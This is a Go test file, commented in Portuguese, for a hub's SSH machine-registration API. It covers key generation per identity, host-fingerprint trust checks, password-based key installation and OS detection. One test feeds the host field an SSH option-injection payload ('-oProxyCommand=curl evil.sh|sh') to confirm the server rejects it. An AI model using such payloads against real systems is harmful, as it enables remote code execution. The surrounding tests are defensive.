package server

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/vxfontes/cutuque/hub/internal/machine"
)

// fakeKeys substitui o machine.KeyStore nos testes: o de verdade roda
// ssh-keygen e ssh-keyscan (disco e rede), que não têm o que fazer aqui.
type fakeKeys struct {
	pub    string
	genErr error
	pubErr error
	// generated/removed registram as chamadas para os testes de rollback.
	// Depois do redesenho, generated/removed são chamados com o nome da
	// IDENTIDADE, nunca o da máquina.
	generated []string
	removed   []string
	rmErr     error

	// scanFPs dá um fingerprint por chamada (a última se repete): é assim que
	// se simula a chave do host mudando entre o cadastro e a confirmação.
	scanFPs   []string
	scanLines string
	scanErr   error
	scanCalls int

	trusted  string
	trustErr error

	installErr   error
	installCalls int
	gotDest      string
	gotPort      int
	gotPassword  string
	gotPub       string
	gotFP        string

	// detectOS / detectErr controlam o resultado de DetectOS (rota nova do
	// redesenho: conecta com a chave já instalada e descobre o SO do host).
	detectOS         string
	detectErr        error
	detectCalls      int
	gotDetectDest    string
	gotDetectPort    int
	gotDetectKeyPath string
	gotDetectFP      string
}

func newFakeKeys() *fakeKeys {
	return &fakeKeys{pub: "ssh-ed25519 AAAAFAKE cutuque-vps"}
}

func (f *fakeKeys) Generate(name string) (string, error) {
	f.generated = append(f.generated, name)
	if f.genErr != nil {
		return "", f.genErr
	}
	return f.pub, nil
}

func (f *fakeKeys) KeyPath(name string) (string, error) {
	return "/data/machines/keys/" + name, nil
}

func (f *fakeKeys) PublicKey(string) (string, error) {
	if f.pubErr != nil {
		return "", f.pubErr
	}
	return f.pub, nil
}

func (f *fakeKeys) RemoveKey(name string) error {
	f.removed = append(f.removed, name)
	return f.rmErr
}

func (f *fakeKeys) Scan(_ context.Context, dest string, _ int) (string, string, error) {
	f.scanCalls++
	if f.scanErr != nil {
		return "", "", f.scanErr
	}
	fp := "SHA256:padrao"
	if n := len(f.scanFPs); n > 0 {
		if f.scanCalls <= n {
			fp = f.scanFPs[f.scanCalls-1]
		} else {
			fp = f.scanFPs[n-1]
		}
	}
	lines := f.scanLines
	if lines == "" {
		lines = dest + " ssh-ed25519 AAAAHOST\n"
	}
	return lines, fp, nil
}

func (f *fakeKeys) Trust(lines string) error {
	if f.trustErr != nil {
		return f.trustErr
	}
	f.trusted += lines
	return nil
}

func (f *fakeKeys) InstallKey(_ context.Context, dest string, port int, password, pub, fp string) error {
	f.installCalls++
	f.gotDest, f.gotPort, f.gotPassword, f.gotPub, f.gotFP = dest, port, password, pub, fp
	return f.installErr
}

func (f *fakeKeys) DetectOS(_ context.Context, dest string, port int, keyPath, expectedFingerprint string) (string, error) {
	f.detectCalls++
	f.gotDetectDest, f.gotDetectPort, f.gotDetectKeyPath, f.gotDetectFP = dest, port, keyPath, expectedFingerprint
	if f.detectErr != nil {
		return "", f.detectErr
	}
	if f.detectOS != "" {
		return f.detectOS, nil
	}
	return "Darwin 24.5.0", nil
}

// identidadeComChave devolve um store de identidades com uma identidade já
// pronta — nome, usuário e KeyPath já preenchido, como fica depois de um POST
// /identities bem-sucedido. É o estado que a maioria dos testes de cadastro de
// MÁQUINA precisa: evita que garanteChave chame Generate à toa (o que
// quebraria asserções como "nenhuma chave foi gerada" em testes que não são
// sobre identidade).
func identidadeComChave(t *testing.T, name, username string) *machine.IdentityStore {
	t.Helper()
	idents := machine.NewIdentityStore()
	if _, err := idents.Add(machine.Identity{Name: name, Username: username}, ""); err != nil {
		t.Fatalf("Add identidade %q: %v", name, err)
	}
	if err := idents.SetKeyPath(name, "/data/machines/keys/"+name); err != nil {
		t.Fatalf("SetKeyPath %q: %v", name, err)
	}
	return idents
}

// identidadeSemChave devolve uma identidade cadastrada mas SEM chave — o
// estado de uma identidade migrada do formato antigo sem key_path, ou de um
// POST /identities que falhou antes do keygen. Serve para os testes que
// exercem justamente o caminho de garanteChave gerando a chave agora.
func identidadeSemChave(t *testing.T, name, username string) *machine.IdentityStore {
	t.Helper()
	idents := machine.NewIdentityStore()
	if _, err := idents.Add(machine.Identity{Name: name, Username: username}, ""); err != nil {
		t.Fatalf("Add identidade %q: %v", name, err)
	}
	return idents
}

// chaveCifraTeste devolve uma chave de cifra válida (32 bytes) em base64,
// determinística e só para teste — necessária para guardar senha na
// identidade (o store em memória puro, NewIdentityStore, não cifra nada).
func chaveCifraTeste(b byte) string {
	return base64.StdEncoding.EncodeToString(bytes.Repeat([]byte{b}, 32))
}

// registroComVPS devolve um registro com a máquina "vps" já cadastrada pelo
// app — host 192.0.2.50:2222, identidade "vx" (usuário "vx") — e o próprio
// store de identidades, já ligado ao registro. O Dest resolvido fica
// "vx@192.0.2.50", que é o valor usado historicamente nestes testes.
func registroComVPS(t *testing.T) (*machine.Registry, *machine.IdentityStore) {
	t.Helper()
	idents := identidadeComChave(t, "vx", "vx")
	r := machine.NewRegistry(nil)
	r.UseIdentities(idents)
	if _, err := r.Add(machine.Machine{Name: "vps", Host: "192.0.2.50", Port: 2222, Identity: "vx"}); err != nil {
		t.Fatalf("Add falhou: %v", err)
	}
	return r, idents
}

// doAdmin chama uma rota de cadastro com registro, KeyStore e identidades
// ligados. idents é ligado ao registro (UseIdentities) antes de servir a
// requisição — mesma relação que o main.go monta em produção, onde o mesmo
// *IdentityStore é passado a machine.NewRegistryAt e a WithIdentities.
func doAdmin(t *testing.T, mreg *machine.Registry, keys MachineKeys, idents *machine.IdentityStore, method, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	return doAdminRaw(t, mreg, keys, idents, method, path, body, true)
}

func doAdminRaw(t *testing.T, mreg *machine.Registry, keys MachineKeys, idents *machine.IdentityStore, method, path, body string, auth bool) *httptest.ResponseRecorder {
	t.Helper()
	if idents != nil {
		mreg.UseIdentities(idents)
	}
	cfg, reg := testDeps()
	req := httptest.NewRequest(method, path, strings.NewReader(body))
	if auth {
		req.Header.Set("Authorization", "Bearer secret")
	}
	rec := httptest.NewRecorder()
	Router(cfg, reg, nil, WithMachines(mreg), WithMachineKeys(keys), WithIdentities(idents)).ServeHTTP(rec, req)
	return rec
}

// erroDe lê o código do corpo de erro ({"error": "..."}).
func erroDe(t *testing.T, rec *httptest.ResponseRecorder) string {
	t.Helper()
	var body struct {
		Error string `json:"error"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("corpo de erro não é json: %v — %s", err, rec.Body.String())
	}
	return body.Error
}

// MARK: POST /machines

func TestPostMachinesCadastraGeraChaveEDevolveAPublica(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	idents := identidadeComChave(t, "vx", "vx")
	keys := newFakeKeys()
	keys.scanFPs = []string{"SHA256:doHost"}

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines",
		`{"name":"vps","host":"192.0.2.50","port":2222,"identity":"vx"}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("status %d, esperava 201: %s", rec.Code, rec.Body.String())
	}
	var got machineCreateResp
	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
		t.Fatalf("json inválido: %v — %s", err, rec.Body.String())
	}
	if got.Machine.Name != "vps" || got.Machine.Dest != "vx@192.0.2.50" || got.Machine.Port != 2222 {
		t.Errorf("máquina errada: %+v", got.Machine)
	}
	if got.Machine.Source != machine.SourceApp {
		t.Errorf("origem = %q, esperava app", got.Machine.Source)
	}
	// A identidade já tinha chave (POST /identities já gerou): o cadastro da
	// MÁQUINA não gera nenhuma — só relê a pública.
	if len(keys.generated) != 0 {
		t.Errorf("gerou chave para identidade que já tinha: %v", keys.generated)
	}
	if got.PublicKey != keys.pub {
		t.Errorf("public_key = %q, esperava %q", got.PublicKey, keys.pub)
	}
	// O fingerprint vem para a usuária conferir — ainda NÃO está confiado.
	if got.Fingerprint != "SHA256:doHost" {
		t.Errorf("fingerprint = %q", got.Fingerprint)
	}
	if m, _ := mreg.Get("vps"); m.HostFingerprint != "" {
		t.Errorf("o cadastro já nasceu confiando no host sem a usuária confirmar: %q", m.HostFingerprint)
	}
	// A chave privada é da IDENTIDADE agora: tem que ficar anotada nela (o
	// ssh -i precisa dela), resolvida na máquina pelo Get.
	if m, _ := mreg.Get("vps"); m.KeyPath != "/data/machines/keys/vx" {
		t.Errorf("key_path não foi resolvido da identidade: %q", m.KeyPath)
	}
}

// A chave da identidade nasce sob demanda: uma identidade migrada do formato
// antigo (ou vinda de um POST /identities anterior ao redesenho) pode não ter
// key_path. O cadastro de máquina cobre esse buraco: gera a chave da
// identidade na hora, e não uma chave por máquina.
func TestPostMachinesGeraChaveDaIdentidadeQuandoAindaNaoTem(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	idents := identidadeSemChave(t, "vx", "vx")
	keys := newFakeKeys()
	keys.scanFPs = []string{"SHA256:doHost"}

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines",
		`{"name":"vps","host":"192.0.2.50","port":2222,"identity":"vx"}`)
	if rec.Code != http.StatusCreated {
		t.Fatalf("status %d, esperava 201: %s", rec.Code, rec.Body.String())
	}
	if len(keys.generated) != 1 || keys.generated[0] != "vx" {
		t.Errorf("a chave não foi gerada para a identidade sem chave: %v", keys.generated)
	}
	id, ok := idents.Get("vx")
	if !ok || id.KeyPath == "" {
		t.Errorf("a identidade continua sem key_path depois do cadastro: %+v ok=%v", id, ok)
	}
}

// Apontar o cadastro para uma identidade que não existe deixaria a máquina
// sem usuário nem chave, falhando depois com um erro de ssh que não explica a
// causa. O cadastro tem que morrer aqui, e sem gerar chave nenhuma.
func TestPostMachinesRecusaIdentidadeDesconhecida(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	idents := machine.NewIdentityStore() // "vx" não existe neste store
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines",
		`{"name":"vps","host":"host","identity":"vx"}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "unknown_identity" {
		t.Errorf("erro = %q", got)
	}
	if _, ok := mreg.Get("vps"); ok {
		t.Error("cadastrou máquina apontando para identidade inexistente")
	}
	if len(keys.generated) != 0 {
		t.Errorf("gerou chave para identidade que nem existe: %v", keys.generated)
	}
}

// O caminho e o conteúdo da chave privada nunca podem sair do macmini.
func TestPostMachinesNaoVazaAChavePrivada(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPost, "/machines",
		`{"name":"vps","host":"host","identity":"vx"}`)
	corpo := rec.Body.String()
	for _, proibido := range []string{"key_path", "/data/machines/keys", "PRIVATE KEY"} {
		if strings.Contains(corpo, proibido) {
			t.Errorf("a resposta vaza %q: %s", proibido, corpo)
		}
	}
}

// Sem porta, 22 — o app não obriga a digitar.
func TestPostMachinesSemPortaUsa22(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	idents := identidadeComChave(t, "vx", "vx")
	doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPost, "/machines", `{"name":"vps","host":"host","identity":"vx"}`)
	if m, _ := mreg.Get("vps"); m.Port != 22 {
		t.Errorf("porta = %d, esperava 22", m.Port)
	}
}

func TestPostMachinesRecusaNomeJaUsado(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	idents := identidadeComChave(t, "vx", "vx")
	keys := newFakeKeys()
	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines", `{"name":"macbook","host":"outro","identity":"vx"}`)
	if rec.Code != http.StatusConflict {
		t.Fatalf("status %d, esperava 409: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "duplicate_name" {
		t.Errorf("erro = %q", got)
	}
	// Nome recusado não pode ter gerado chave nenhuma — nem sobrescrito a da
	// máquina do env que já tinha esse nome.
	if len(keys.generated) != 0 {
		t.Errorf("gerou chave para um nome recusado: %v", keys.generated)
	}
}

// Nome vira nome de arquivo da chave e segmento de rota: "../fuga" tem que
// morrer no cadastro, antes de qualquer escrita.
func TestPostMachinesRecusaNomeInvalido(t *testing.T) {
	for _, nome := range []string{"../fuga", "a/b", "", "com espaço"} {
		mreg := machine.NewRegistry(nil)
		idents := identidadeComChave(t, "vx", "vx")
		keys := newFakeKeys()
		body := `{"name":` + jsonStr(nome) + `,"host":"host","identity":"vx"}`
		rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines", body)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("nome %q: status %d, esperava 400", nome, rec.Code)
		}
		if len(keys.generated) != 0 {
			t.Errorf("nome %q: gerou chave mesmo assim", nome)
		}
	}
}

func TestPostMachinesRecusaHostQueViraOpcaoDoSsh(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPost, "/machines",
		`{"name":"vps","host":"-oProxyCommand=curl evil.sh|sh","identity":"vx"}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400: %s", rec.Code, rec.Body.String())
	}
}

func TestPostMachinesCorpoQuebradoE400(t *testing.T) {
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, machine.NewRegistry(nil), newFakeKeys(), idents, http.MethodPost, "/machines", `{oops`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400", rec.Code)
	}
}

// Host fora do ar: melhor não deixar cadastro pela metade. Sem fingerprint o
// hub se recusa a conectar, então o cadastro seria inútil e a usuária teria
// que apagá-lo na mão antes de tentar de novo.
func TestPostMachinesDesfazOCadastroSeOScanFalha(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	idents := identidadeComChave(t, "vx", "vx")
	keys := newFakeKeys()
	keys.scanErr = errors.New("host não respondeu")

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines", `{"name":"vps","host":"host","identity":"vx"}`)
	if rec.Code != http.StatusBadGateway {
		t.Fatalf("status %d, esperava 502: %s", rec.Code, rec.Body.String())
	}
	if _, ok := mreg.Get("vps"); ok {
		t.Error("o cadastro ficou pela metade no registro")
	}
	// A chave é da IDENTIDADE, não da máquina: desfazer o cadastro não pode
	// apagá-la — ela pode estar em uso por outras máquinas da mesma conta.
	if len(keys.removed) != 0 {
		t.Errorf("a chave da identidade foi apagada ao desfazer um cadastro: %v", keys.removed)
	}
}

// Quando a identidade ainda não tem chave, o cadastro tenta gerá-la ANTES de
// tocar no registro. Se o keygen falhar, nenhuma máquina chega a ser criada —
// não há "pela metade" para desfazer, porque o Add nem roda.
func TestPostMachinesDesfazOCadastroSeOKeygenFalha(t *testing.T) {
	mreg := machine.NewRegistry(nil)
	idents := identidadeSemChave(t, "vx", "vx")
	keys := newFakeKeys()
	keys.genErr = errors.New("ssh-keygen sumiu")

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines", `{"name":"vps","host":"host","identity":"vx"}`)
	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status %d, esperava 500: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "keygen_failed" {
		t.Errorf("erro = %q", got)
	}
	if _, ok := mreg.Get("vps"); ok {
		t.Error("máquina sem chave ficou no registro")
	}
}

// Sem KeyStore o hub serve só a lista: nada de cadastrar. O mux responde 405
// porque /machines existe em GET.
func TestSemKeyStoreOCadastroNaoExiste(t *testing.T) {
	cfg, reg := testDeps()
	req := httptest.NewRequest(http.MethodPost, "/machines", strings.NewReader(`{"name":"vps","host":"y","identity":"x"}`))
	req.Header.Set("Authorization", "Bearer secret")
	rec := httptest.NewRecorder()
	Router(cfg, reg, nil, WithMachines(machine.NewRegistry(nil))).ServeHTTP(rec, req)
	if rec.Code == http.StatusCreated {
		t.Fatalf("cadastrou sem KeyStore configurado: %s", rec.Body.String())
	}
}

// Depois do redesenho o cadastro exige AMBOS: cofre de chaves E store de
// identidades (a máquina do app não tem usuário nem chave sem uma
// identidade). Só o cofre, sem identidades, também não deve registrar a rota.
func TestComChaveMasSemIdentidadesOCadastroNaoExiste(t *testing.T) {
	cfg, reg := testDeps()
	req := httptest.NewRequest(http.MethodPost, "/machines", strings.NewReader(`{"name":"vps","host":"y","identity":"x"}`))
	req.Header.Set("Authorization", "Bearer secret")
	rec := httptest.NewRecorder()
	Router(cfg, reg, nil, WithMachines(machine.NewRegistry(nil)), WithMachineKeys(newFakeKeys())).ServeHTTP(rec, req)
	if rec.Code == http.StatusCreated {
		t.Fatalf("cadastrou sem store de identidades configurado: %s", rec.Body.String())
	}
}

// MARK: POST /machines/{n}/trust

func TestPostTrustGravaOKnownHostsEOFingerprint(t *testing.T) {
	mreg, idents := registroComVPS(t)
	keys := newFakeKeys()
	keys.scanFPs = []string{"SHA256:doHost"}

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/trust",
		`{"fingerprint":"SHA256:doHost"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(keys.trusted, "ssh-ed25519 AAAAHOST") {
		t.Errorf("a chave do host não foi para o known_hosts: %q", keys.trusted)
	}
	m, _ := mreg.Get("vps")
	if m.HostFingerprint != "SHA256:doHost" {
		t.Errorf("fingerprint no registro = %q", m.HostFingerprint)
	}
}

// O coração do TOFU: entre o cadastro e a confirmação, o hub escaneia de novo.
// Se a chave mudou nesse meio, quem responde não é quem a usuária conferiu.
func TestPostTrustRecusaSeAChaveDoHostMudouDepoisDoCadastro(t *testing.T) {
	mreg, idents := registroComVPS(t)
	keys := newFakeKeys()
	keys.scanFPs = []string{"SHA256:doAtacante"} // o app confirmou outra

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/trust",
		`{"fingerprint":"SHA256:queAUsuariaViu"}`)
	if rec.Code != http.StatusConflict {
		t.Fatalf("status %d, esperava 409: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "fingerprint_mismatch" {
		t.Errorf("erro = %q", got)
	}
	// Nada pode ter sido confiado nem gravado.
	if keys.trusted != "" {
		t.Errorf("gravou no known_hosts mesmo com divergência: %q", keys.trusted)
	}
	if m, _ := mreg.Get("vps"); m.HostFingerprint != "" {
		t.Errorf("gravou o fingerprint mesmo com divergência: %q", m.HostFingerprint)
	}
	// A usuária precisa ver as duas chaves para entender o que houve.
	corpo := rec.Body.String()
	if !strings.Contains(corpo, "SHA256:doAtacante") || !strings.Contains(corpo, "SHA256:queAUsuariaViu") {
		t.Errorf("o erro não mostra as duas impressões digitais: %s", corpo)
	}
}

func TestPostTrustSemFingerprintE400(t *testing.T) {
	mreg, idents := registroComVPS(t)
	keys := newFakeKeys()
	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/trust", `{}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400", rec.Code)
	}
	if keys.scanCalls != 0 {
		t.Error("foi na rede sem ter o que comparar")
	}
}

// Máquina do hub.env usa o ~/.ssh do próprio hub, não o known_hosts do cadastro.
func TestPostTrustDeMaquinaDoEnvE403(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPost, "/machines/macbook/trust",
		`{"fingerprint":"SHA256:x"}`)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status %d, esperava 403: %s", rec.Code, rec.Body.String())
	}
}

func TestPostTrustDeMaquinaInexistenteE404(t *testing.T) {
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, machine.NewRegistry(nil), newFakeKeys(), idents, http.MethodPost,
		"/machines/fantasma/trust", `{"fingerprint":"SHA256:x"}`)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status %d, esperava 404", rec.Code)
	}
}

// MARK: POST /machines/{n}/install-key

func TestPostInstallKeyMandaASenhaEAPublicaParaODestino(t *testing.T) {
	mreg, idents := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/install-key",
		`{"password":"senha-da-vanessa"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	if keys.gotDest != "vx@192.0.2.50" || keys.gotPort != 2222 {
		t.Errorf("destino errado: %s:%d", keys.gotDest, keys.gotPort)
	}
	if keys.gotPassword != "senha-da-vanessa" || keys.gotPub != keys.pub {
		t.Errorf("senha/chave erradas: %q / %q", keys.gotPassword, keys.gotPub)
	}
	// A senha só viaja para o host cujo fingerprint foi confirmado.
	if keys.gotFP != "SHA256:confirmado" {
		t.Errorf("fingerprint esperado = %q", keys.gotFP)
	}
	// A senha é de uso único: não pode ter ficado no registro.
	if m, _ := mreg.Get("vps"); strings.Contains(m.Dest+m.KeyPath+m.HostFingerprint, "senha-da-vanessa") {
		t.Error("a senha ficou guardada no registro")
	}
}

// O teste que mais importa da fase: mandar a senha para um host que a usuária
// não confirmou é entregá-la a quem estiver no meio.
func TestPostInstallKeyNaoMandaASenhaAntesDoTOFU(t *testing.T) {
	mreg, idents := registroComVPS(t) // sem SetFingerprint
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/install-key",
		`{"password":"senha-da-vanessa"}`)
	if rec.Code != http.StatusConflict {
		t.Fatalf("status %d, esperava 409: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "not_trusted" {
		t.Errorf("erro = %q", got)
	}
	if keys.installCalls != 0 {
		t.Error("a senha foi enviada para um host não confirmado")
	}
}

// Senha vazia no corpo, e a identidade não guarda nenhuma: não há o que
// tentar, e o app precisa saber que tem que pedir uma.
func TestPostInstallKeySemSenhaNoCorpoESemSenhaGuardadaDa400(t *testing.T) {
	mreg, idents := registroComVPS(t) // identidade sem senha guardada
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/install-key", `{"password":""}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "no_password" {
		t.Errorf("erro = %q", got)
	}
	if keys.installCalls != 0 {
		t.Error("tentou conectar sem ter senha nenhuma")
	}
}

// A regra nova do redesenho: corpo com senha vazia significa "usa a guardada
// na identidade" — não "não instale". Com a identidade guardando senha (o
// que exige um store cifrado), o install-key tem que usá-la sem o app
// precisar redigitar nada.
func TestPostInstallKeyUsaASenhaGuardadaNaIdentidadeQuandoOCorpoVemVazio(t *testing.T) {
	idents, err := machine.NewIdentityStoreAt("", chaveCifraTeste(0x40))
	if err != nil {
		t.Fatalf("NewIdentityStoreAt: %v", err)
	}
	if _, err := idents.Add(machine.Identity{Name: "vx", Username: "vx"}, "senha-guardada"); err != nil {
		t.Fatalf("Add: %v", err)
	}
	if err := idents.SetKeyPath("vx", "/data/machines/keys/vx"); err != nil {
		t.Fatalf("SetKeyPath: %v", err)
	}
	mreg := machine.NewRegistry(nil)
	if _, err := mreg.Add(machine.Machine{Name: "vps", Host: "192.0.2.50", Port: 2222, Identity: "vx"}); err != nil {
		t.Fatalf("Add: %v", err)
	}
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/install-key", `{"password":""}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	if keys.gotPassword != "senha-guardada" {
		t.Errorf("senha usada = %q, esperava a guardada na identidade", keys.gotPassword)
	}
}

func TestPostInstallKeyFalhaDoDestinoVira502ComMotivo(t *testing.T) {
	mreg, idents := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()
	keys.installErr = errors.New("não deu para autenticar em vx@192.0.2.50")

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/install-key",
		`{"password":"errada"}`)
	if rec.Code != http.StatusBadGateway {
		t.Fatalf("status %d, esperava 502: %s", rec.Code, rec.Body.String())
	}
	// Sem o motivo a usuária não sabe se errou a senha ou se o host caiu.
	if !strings.Contains(rec.Body.String(), "autenticar") {
		t.Errorf("o erro não diz o que houve: %s", rec.Body.String())
	}
	// E o motivo não pode devolver a senha de volta.
	if strings.Contains(rec.Body.String(), "errada") {
		t.Errorf("a senha apareceu na resposta: %s", rec.Body.String())
	}
}

// MARK: POST /machines/{n}/detect-os

func TestPostDetectOSGravaOSistemaOperacional(t *testing.T) {
	mreg, idents := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()
	keys.detectOS = "Darwin 24.5.0"

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/detect-os", "")
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	var got machineResp
	if err := json.Unmarshal(rec.Body.Bytes(), &got); err != nil {
		t.Fatalf("json inválido: %v — %s", err, rec.Body.String())
	}
	if got.Machine.OS != "Darwin 24.5.0" {
		t.Errorf("os = %q, esperava Darwin 24.5.0", got.Machine.OS)
	}
	if m, _ := mreg.Get("vps"); m.OS != "Darwin 24.5.0" {
		t.Errorf("o registro não gravou o SO: %+v", m)
	}
	// Detecta com a CHAVE da identidade (prova que a instalação funcionou),
	// nunca com senha.
	if keys.gotDetectKeyPath != "/data/machines/keys/vx" {
		t.Errorf("key_path usado no detect = %q", keys.gotDetectKeyPath)
	}
	if keys.gotDetectFP != "SHA256:confirmado" {
		t.Errorf("fingerprint usado no detect = %q", keys.gotDetectFP)
	}
}

// Sem TOFU confirmado não há por que conectar: o hub se recusaria de qualquer
// jeito, e tentar antes só desperdiçaria uma chamada de rede.
func TestPostDetectOSSemTrustE409(t *testing.T) {
	mreg, idents := registroComVPS(t) // sem SetFingerprint
	keys := newFakeKeys()

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/detect-os", "")
	if rec.Code != http.StatusConflict {
		t.Fatalf("status %d, esperava 409: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "not_trusted" {
		t.Errorf("erro = %q", got)
	}
	if keys.detectCalls != 0 {
		t.Error("tentou conectar num host não confirmado")
	}
}

func TestPostDetectOSFalhaDaConexaoE502(t *testing.T) {
	mreg, idents := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	keys := newFakeKeys()
	keys.detectErr = errors.New("ssh: connection refused")

	rec := doAdmin(t, mreg, keys, idents, http.MethodPost, "/machines/vps/detect-os", "")
	if rec.Code != http.StatusBadGateway {
		t.Fatalf("status %d, esperava 502: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "detect_failed" {
		t.Errorf("erro = %q", got)
	}
	if m, _ := mreg.Get("vps"); m.OS != "" {
		t.Errorf("gravou SO mesmo com a detecção falhando: %q", m.OS)
	}
}

func TestPostDetectOSDeMaquinaDoEnvE403(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPost, "/machines/macbook/detect-os", "")
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status %d, esperava 403: %s", rec.Code, rec.Body.String())
	}
}

func TestPostDetectOSDeMaquinaInexistenteE404(t *testing.T) {
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, machine.NewRegistry(nil), newFakeKeys(), idents, http.MethodPost, "/machines/fantasma/detect-os", "")
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status %d, esperava 404", rec.Code)
	}
}

// MARK: PATCH e DELETE

func TestPatchMachineAlteraOHost(t *testing.T) {
	mreg, idents := registroComVPS(t)
	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPatch, "/machines/vps",
		`{"host":"192.0.2.99","port":22}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	m, _ := mreg.Get("vps")
	if m.Dest != "vx@192.0.2.99" || m.Port != 22 {
		t.Errorf("patch não pegou: %+v", m)
	}
}

func TestPatchMachineDoEnvE403(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPatch, "/machines/macbook", `{"host":"outro"}`)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status %d, esperava 403: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "read_only" {
		t.Errorf("erro = %q", got)
	}
}

// Apontar o PATCH para uma identidade que não existe é recusado antes de
// mexer no registro — a identidade atual (já conferida quando a máquina foi
// cadastrada) fica intocada.
func TestPatchMachineIdentidadeDesconhecidaE400(t *testing.T) {
	mreg, idents := registroComVPS(t)
	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPatch, "/machines/vps", `{"identity":"fantasma"}`)
	if rec.Code != http.StatusBadRequest {
